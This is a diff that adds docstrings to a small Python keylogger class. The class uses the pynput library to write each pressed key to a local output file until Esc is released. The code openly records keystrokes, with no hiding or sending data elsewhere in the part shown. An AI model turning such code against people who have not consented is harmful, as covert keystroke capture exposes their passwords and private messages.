@@ -20,11 +20,23 @@ class keylog:
         method does necessary actions upon key release. 
     """
     def __init__(self, outfileName: str = "out.txt"):
+        """
+        Sets up the keylogger listener.
+
+        outfileName : str
+            the name of the output file. 
+        """
         self.outfile  = open(outfileName, "w")
         with keyboard.Listener(on_press=self.on_press, on_release=self.on_release) as listener:
             listener.join()
 
     def on_press(self, key: keyboard.Key):
+        """
+        Does necessary opperations for when a key is pressed. 
+
+        key : keyboard.Key
+            the key pressed.
+        """
         try:
             self.outfile.write(key.char)
 
@@ -33,6 +45,12 @@ class keylog:
             pass
 
     def on_release(self, key: keyboard.Key):
+        """
+        Does necessary opperations for when a key is released. 
+
+        key : keyboard.Key
+            the key released.
+        """
         
         #close the outfile and exit this program when finished
         if key == keyboard.Key.esc:
